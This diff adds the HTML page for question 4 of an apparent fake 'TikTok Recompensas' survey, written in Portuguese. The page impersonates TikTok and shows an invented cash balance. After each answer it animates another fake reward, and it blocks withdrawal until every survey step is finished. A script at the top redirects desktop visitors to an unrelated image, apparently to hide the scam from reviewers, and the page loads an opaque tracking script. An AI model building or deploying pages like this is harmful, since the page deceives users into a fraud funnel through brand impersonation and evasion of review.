@@ -1,0 +1,537 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Recompensas – Pergunta 4</title>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+  if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+    window.location.href = 'https://image.1111down.com/xG1nkqKTMzGDvpLrqFT7WA/ef311940-320d-4b47-94ef-600f2eafd920/width=450/1272375.jpeg';
+  }
+  </script>
+
+
+
+
+
+
+
+
+
+
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <!-- Tracking (keep the file in the folder) -->
+  <script src="js/kudWeJFHoBYf.js" defer=""></script>
+
+  <style>
+    /* Reset & base styles */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    /* TikTok Palette (adapted for white background - Refined) */
+    :root {
+      --tt-red: #FE2C55; /* TikTok's vibrant red */
+      --tt-cyan: #00F2EA; /* TikTok's cyan accent */
+      --tt-shadow-red: #D60032; /* Darker red for logo shadow */
+      --tt-shadow-cyan: #00C8C3; /* Darker cyan for logo shadow */
+
+      --light-bg-main: #F9F9F9; /* Very light gray for main background - subtle off-white */
+      --white-card-bg: #FFFFFF; /* Pure white for cards/elements - crisp */
+      
+      --text-main-dark: #333333; /* Softer dark gray for main text - professional */
+      --text-secondary-light: #777777; /* Medium gray for secondary text - readable */
+      --border-subtle: #E0E0E0; /* Light gray for borders - clean */
+      --border-active: #C0C0C0; /* Slightly darker border for active states */
+      
+      --money-green: #2ECC71; /* A clear, vibrant green for money values */
+      --error-red: #EF4444; /* Standard error red */
+      --white: #ffffff;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start; /* Align to top for scrollable content */
+      font-family: 'Inter', Arial, Helvetica, sans-serif;
+      background: var(--light-bg-main); /* Main light background */
+      color: var(--text-main-dark); /* Default text color - softer dark gray */
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden; /* Prevent horizontal scrolling */
+      padding-bottom: 2rem; /* Spacing for footer */
+    }
+
+    /* Animations */
+    @keyframes scaleIn { 0% { opacity: 0; transform: scale(.95); } 100% { opacity: 1; transform: scale(1); } }
+    @keyframes barGrow { from { width: 0; } to { width: var(--p); } }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(254, 44, 85, 0.25); } /* Red shadow for pulse effect */
+      50% { transform: scale(1.03); box-shadow: 0 6px 20px rgba(254, 44, 85, 0.4); }
+    }
+
+    /* General Layout */
+    .wrapper {
+      width: 100%;
+      max-width: 428px;
+      background: var(--light-bg-main);
+    }
+
+    /* HEADER */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: .75rem 1rem;
+      background: var(--white-card-bg); /* White header background */
+      border-bottom: 1px solid var(--border-subtle); /* Subtle border */
+      box-shadow: 0 2px 5px rgba(0,0,0,0.03); /* Subtle shadow */
+    }
+
+    /* Logo Image Styling */
+    .logo-img {
+      height: 32px; /* Fixed height for consistency */
+      object-fit: contain; /* Ensures the image fits within the bounds */
+    }
+    
+    .ctrls {
+      display: flex;
+      align-items: center;
+      gap: .75rem;
+    }
+
+    /* BALANCE PILL */
+    .pill {
+      display: flex;
+      align-items: center;
+      gap: .5rem;
+      padding: .35rem .85rem;
+      background: var(--light-bg-main); /* Lighter background for the pill */
+      border: 1px solid var(--border-subtle); /* Subtle border */
+      border-radius: 9999px;
+      font-size: .9rem;
+      font-weight: 700;
+      color: var(--text-main-dark); /* Text color - softer dark gray */
+    }
+    .wallet-icon { width: 18px; height: 18px; color: var(--money-green); }
+
+    /* WITHDRAW BUTTON */
+    .btn-sacar {
+      padding: .5rem 1.2rem;
+      font-size: .85rem;
+      font-weight: 800;
+      color: var(--white);
+      background: linear-gradient(90deg, var(--tt-red) 0%, var(--tt-shadow-red) 100%); /* Red gradient */
+      border: none;
+      border-radius: 9999px;
+      cursor: pointer;
+      transition: background .2s, transform .2s;
+      box-shadow: 0 2px 8px rgba(254, 44, 85, 0.2); /* Subtle red shadow */
+    }
+    .btn-sacar:hover {
+      background: var(--tt-shadow-red);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(254, 44, 85, 0.3);
+    }
+
+    /* QUESTION CARD */
+    .card {
+      margin: 1.25rem 1rem 0;
+      background: var(--white-card-bg); /* White card background */
+      border-radius: 1.25rem;
+      box-shadow: 0 6px 20px rgba(0,0,0,.08); /* Clearer shadow on white */
+      padding: 2rem 1.5rem 1.75rem;
+      display: flex;
+      flex-direction: column;
+    }
+    .q-title {
+      font-size: clamp(1.3rem, 5vw, 1.55rem);
+      font-weight: 800;
+      text-align: center;
+      margin-bottom: .5rem;
+      line-height: 1.35;
+      color: var(--text-main-dark); /* Softer dark gray */
+    }
+    .q-sub {
+      font-size: clamp(.9rem, 2.5vw, 1rem);
+      color: var(--text-secondary-light); /* Medium gray */
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
+
+    /* PROGRESS BAR */
+    .track {
+      height: 8px;
+      width: 100%;
+      background: var(--border-subtle); /* Light background for the track */
+      border-radius: 9999px;
+      overflow: hidden;
+      margin-bottom: 1.5rem;
+    }
+    .bar {
+      height: 100%;
+      background: var(--tt-red); /* Red progress bar */
+      --p: 80%; /* Adjusted for Question 4 */
+      animation: barGrow 1s ease-out forwards;
+    }
+
+    /* OPTIONS */
+    .options { display: flex; flex-direction: column; gap: .75rem; }
+    .opt { position: relative; }
+    .opt input { display: none; }
+    .label {
+      display: flex;
+      align-items: center;
+      gap: .8rem;
+      padding: 1.1rem;
+      background: var(--light-bg-main); /* Lighter background for options */
+      border: 2px solid var(--border-subtle); /* Subtle border */
+      border-radius: .75rem;
+      cursor: pointer;
+      transition: border-color .2s, background-color .2s, transform .2s;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text-main-dark); /* Text color - softer dark gray */
+    }
+    .label:hover { transform: translateY(-2px); border-color: var(--border-active); } /* Slightly darker border on hover */
+    .icon { width: 24px; height: 24px; color: var(--text-secondary-light); transition: color .2s; } /* Icon color - medium gray */
+    .chk {
+      margin-left: auto;
+      width: 24px;
+      height: 24px;
+      border: 2px solid var(--border-active); /* Border color for checkbox */
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--white);
+      transition: background-color .2s, border-color .2s;
+      flex-shrink: 0;
+    }
+    .chk svg { display: none; }
+
+    /* CHECKED STATE */
+    .opt input:checked+.label {
+      border-color: var(--tt-red); /* Red border when checked */
+      background: rgba(254, 44, 85, 0.05); /* Very light red background */
+    }
+    .opt input:checked+.label .icon { color: var(--tt-red); } /* Red icon when checked */
+    .opt input:checked+.label .chk {
+      background: var(--tt-red); /* Red checkbox background */
+      border-color: var(--tt-red);
+    }
+    .opt input:checked+.label .chk svg { display: block; }
+
+    /* ERROR MESSAGE + CONTINUE BUTTON */
+    .err { display: none; text-align: center; font-size: .875rem; color: var(--error-red); margin: .5rem 0 .8rem; }
+    .btn-cont {
+      margin-top: 1rem;
+      width: 100%;
+      padding: 1.1rem;
+      font-size: 1.1rem;
+      font-weight: 800;
+      border: none;
+      border-radius: .75rem;
+      cursor: not-allowed;
+      background: rgba(254, 44, 85, 0.1); /* Light red for disabled state */
+      color: rgba(51,51,51,0.4); /* Faded text for disabled state (using text-main-dark for base) */
+      transition: transform .2s, background .2s, color .2s, box-shadow .2s;
+    }
+    .btn-cont.on {
+      cursor: pointer;
+      color: var(--white);
+      background: linear-gradient(90deg, var(--tt-red) 0%, var(--tt-shadow-red) 100%); /* Vibrant red gradient */
+      box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
+    }
+    .btn-cont.on:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(254, 44, 85, 0.45);
+    }
+
+    /* FOOTER */
+    .footer {
+      text-align: center;
+      font-size: .8rem;
+      color: var(--text-secondary-light); /* Medium gray */
+      padding: 1.5rem 1rem 2rem;
+    }
+    .footer .bonus { color: var(--tt-red); font-weight: 700; margin-bottom: .4rem; }
+    .footer strong { font-weight: 700; color: var(--text-main-dark); } /* Softer dark gray */
+
+    /* OVERLAYS */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.5); /* Semi-transparent background for overlays */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity .3s, visibility .3s;
+      z-index: 100;
+      padding: 1rem;
+    }
+    .overlay.show { opacity: 1; visibility: visible; }
+    .overlay .box-content { animation: scaleIn .3s cubic-bezier(.18,.89,.32,1.28); }
+
+    /* REWARD POP-UP */
+    .reward-box {
+      width: 100%;
+      max-width: 350px;
+      background: var(--white-card-bg); /* White background for pop-up */
+      border-radius: 1.25rem;
+      text-align: center;
+      box-shadow: 0 10px 25px -5px rgba(0,0,0,.15);
+      overflow: hidden;
+    }
+    .box-top {
+      position: relative;
+      background: linear-gradient(180deg, var(--tt-red) 0%, var(--tt-shadow-red) 100%); /* Red gradient top */
+      padding: 2rem 1rem 1.5rem;
+      color: var(--white);
+    }
+    .big-icon { width: 44px; height: 44px; margin-bottom: .75rem; }
+    .box-title { font-size: 1.375rem; font-weight: 700; }
+    .box-mid { padding: 1.5rem 1.75rem 2rem; }
+    .box-mid .sub { font-size: 1rem; font-weight: 500; margin-bottom: .5rem; color: var(--text-secondary-light); } /* Medium gray */
+    .value {
+      font-size: clamp(2.75rem,10vw,3.25rem);
+      font-weight: 800;
+      color: var(--money-green); /* Green for value */
+      margin:.25rem 0 1.25rem;line-height:1;display:flex;align-items:center;justify-content:center;gap:.25rem
+    }
+    .value span:first-child{font-size:1.75rem;font-weight:600}
+    .hint{font-size:.9rem;color: var(--text-secondary-light);line-height:1.5} /* Medium gray */
+    .hint strong{color:var(--tt-red)} /* Hint text in red */
+    .btn-next{
+      margin-top:1.5rem;width:100%;padding:1rem;font-size:1.1rem;font-weight:800;border:none;border-radius:.75rem;
+      color:var(--white);cursor:pointer;transition:transform .2s,box-shadow .2s;
+      background:linear-gradient(90deg,var(--tt-red)0%,var(--tt-shadow-red)100%);animation:pulse 2s infinite
+    }
+
+    /* WITHDRAW POP-UP */
+    .withdraw-box{
+      position:relative;width:100%;max-width:350px;background:var(--white-card-bg);
+      border-radius:1.25rem;text-align:center;box-shadow:0 10px 25px -5px rgba(0,0,0,.15);overflow:hidden
+    }
+    .btn-close-popup{
+      position:absolute;top:.75rem;right:.75rem;background:rgba(0,0,0,.08);border:none;cursor:pointer;
+      padding:.4rem;display:flex;border-radius:99px;color:var(--text-secondary-light);transition:background .2s;z-index:10
+    }
+    .btn-close-popup:hover{background:rgba(0,0,0,.15)}
+    .withdraw-box .box-top{padding:1.5rem 1rem}
+    .withdraw-box .box-top .big-icon{width:36px;height:36px;margin-bottom:.75rem}
+    .withdraw-box .box-title{font-size:1.25rem;font-weight:700}
+    .withdraw-box .box-mid{padding:1.5rem 1.75rem 2rem;font-size:.95rem;line-height:1.5;color:var(--text-main-dark)} /* Softer dark gray */
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+
+    <!-- Header -->
+    <header class="header">
+      <!-- Your custom logo image -->
+      <img src="images/nq9tmm7esNym.png" alt="Seu Logo" class="logo-img" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/100x32/FE2C55/FFFFFF?text=LOGO';">
+      <div class="ctrls">
+        <span id="bal" class="pill">
+          <i data-lucide="wallet" class="wallet-icon"></i>
+          <span>R$0,00</span>
+        </span>
+        <button id="wdBtn" class="btn-sacar">SACAR</button>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="card">
+      <h2 class="q-title">Quantas horas por dia você passa no aplicativo?</h2>
+      <p class="q-sub">Selecione uma opção para continuar:</p>
+
+      <!-- Progress Bar (adjusted for 80%) -->
+      <div class="track"><div class="bar"></div></div>
+
+      <!-- Dynamic Options -->
+      <div id="opts" class="options"></div>
+
+      <!-- Error Message -->
+      <p id="err" class="err">Por favor, selecione uma opção.</p>
+
+      <!-- Continue Button -->
+      <button id="contBtn" class="btn-cont">CONTINUAR</button>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <p class="bonus">Concorra a um bônus adicional</p>
+      <p>Ao participar das atividades, você concorda com nossos <strong>Termos</strong> e <strong>Condições</strong>.</p>
+    </footer>
+  </div>
+
+  <!-- Reward Pop-up -->
+  <div id="rewardOv" class="overlay">
+    <div class="reward-box box-content">
+      <div class="box-top">
+        <i data-lucide="party-popper" class="big-icon"></i>
+        <p class="box-title">Uau! Recompensa Desbloqueada!</p>
+      </div>
+      <div class="box-mid">
+        <p class="sub">Você acaba de ganhar:</p>
+        <p class="value"><span>R$</span><span id="val">0,00</span></p>
+        <p class="hint">Responda a próxima pergunta para desbloquear um prêmio ainda <strong>maior</strong>!</p>
+        <button id="nextBtn" class="btn-next">Continuar para o próximo prêmio</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Withdraw Pop-up -->
+  <div id="wdOv" class="overlay">
+    <div class="withdraw-box box-content">
+      <button id="closeWdBtn" class="btn-close-popup">
+        <i data-lucide="x" style="width:20px;height:20px;"></i>
+      </button>
+      <div class="box-top">
+        <i data-lucide="shield-alert" class="big-icon"></i>
+        <h3 class="box-title">AVISO IMPORTANTE</h3>
+      </div>
+      <div class="box-mid">
+        <p>Para sua segurança, o saque será liberado após a conclusão de todas as etapas da pesquisa. Continue para garantir seu prêmio!</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const NEXT_PAGE = '../05/index.html'; // Redirects to quiz5
+      const REWARD_IN_CENTS = 6820;
+      const INITIAL_BALANCE_IN_CENTS = 31890; // 24660 (from quiz3) + 7230 (from quiz3)
+      const SURVEY_OPTIONS = [
+        { value: 'Menos de 1 hora', icon: 'hourglass' }, 
+        { value: '1 a 2 horas', icon: 'hourglass' },
+        { value: '2 a 4 horas', icon: 'hourglass' },
+        { value: '4 a 6 horas', icon: 'hourglass' },
+        { value: 'Mais de 6 horas', icon: 'hourglass' }
+      ];
+
+      /* Referências DOM */
+      const balanceDisplay = document.querySelector('#bal span');
+      const optionsWrapper = document.getElementById('opts');
+      const continueBtn    = document.getElementById('contBtn');
+      const errorEl        = document.getElementById('err');
+      const rewardOverlay  = document.getElementById('rewardOv');
+      const withdrawOverlay = document.getElementById('wdOv');
+      const withdrawBtn    = document.getElementById('wdBtn');
+      const closeWdBtn     = document.getElementById('closeWdBtn');
+      const rewardValueEl  = document.getElementById('val');
+      const nextBtn        = document.getElementById('nextBtn');
+
+      let selectedOption = null;
+      let withdrawTimeout;
+
+      /* Helpers */
+      const formatCurrency   = c => (c / 100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
+      const formatSimple     = c => (c / 100).toLocaleString('pt-BR',{minimumFractionDigits:2});
+      const animateValue = (el,start,end,dur,fmt)=>{
+        let t0=null;
+        const step = ts=>{
+          if(!t0)t0=ts;
+          const p=Math.min((ts-t0)/dur,1);
+          el.textContent=fmt(Math.floor(p*(end-start)+start));
+          if(p<1)window.requestAnimationFrame(step);
+        };
+        window.requestAnimationFrame(step);
+      };
+
+      /* Reward Audio */
+      let audioContext,audioBuffer;
+      const initAudio = () => {
+        try{
+          audioContext = new (window.AudioContext||window.webkitAudioContext)();
+          fetch('../complementares/audios/sonoro-efeito.mp3')
+            .then(r=>r.arrayBuffer())
+            .then(buf=>audioContext.decodeAudioData(buf))
+            .then(data=>audioBuffer=data)
+            .catch(err=>console.error('Erro ao carregar áudio:',err));
+        }catch(e){console.error('API de Áudio não suportada:',e);}
+      };
+      const playSound = () => {
+        if(!audioContext||!audioBuffer)return;
+        if(audioContext.state==='suspended')audioContext.resume();
+        const src=audioContext.createBufferSource();
+        src.buffer=audioBuffer;src.connect(audioContext.destination);src.start(0);
+      };
+
+      /* Render Options */
+      optionsWrapper.innerHTML = SURVEY_OPTIONS.map((opt,i)=>`
+        <div class="opt">
+          <input type="radio" id="op${i}" name="q" value="${opt.value}">
+          <label class="label" for="op${i}">
+            <i data-lucide="${opt.icon}" class="icon"></i>${opt.value}
+            <span class="chk">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                   stroke="currentColor" stroke-width="3.5" stroke-linecap="round"
+                   stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></polyline></svg>
+            </span>
+          </label>
+        </div>`).join('');
+
+      lucide.createIcons();
+
+      /* Option Selection */
+      document.querySelectorAll('input[name="q"]').forEach(r=>{
+        r.addEventListener('change',e=>{
+          selectedOption=e.target.value;
+          errorEl.style.display='none';
+          continueBtn.disabled=false;
+          continueBtn.classList.add('on');
+        });
+      });
+
+      /* Continue Button Action */
+      continueBtn.addEventListener('click',()=>{
+        if(!selectedOption){errorEl.style.display='block';return;}
+        playSound();
+        animateValue(rewardValueEl,0,REWARD_IN_CENTS,1500,formatSimple);
+        rewardOverlay.classList.add('show');
+      });
+
+      /* Next Page Navigation */
+      nextBtn.addEventListener('click',()=>{
+        window.location.href = `${NEXT_PAGE}${window.location.search}`;
+      });
+
+      /* Withdraw Pop-up Logic */
+      const openWithdraw = ()=>{
+        withdrawOverlay.classList.add('show');
+        clearTimeout(withdrawTimeout);
+        withdrawTimeout=setTimeout(closeWithdraw,5000);
+      };
+      const closeWithdraw=()=>{
+        clearTimeout(withdrawTimeout);
+        withdrawOverlay.classList.remove('show');
+      };
+      withdrawBtn.addEventListener('click',openWithdraw);
+      closeWdBtn .addEventListener('click',closeWithdraw);
+
+      /* Initial State Setup */
+      balanceDisplay.textContent = formatCurrency(INITIAL_BALANCE_IN_CENTS);
+      continueBtn.disabled=true;
+
+      /* Initialize audio on first user interaction */
+      document.body.addEventListener('click',initAudio,{once:true});
+    });
+  </script>
+
+
+</body></html>
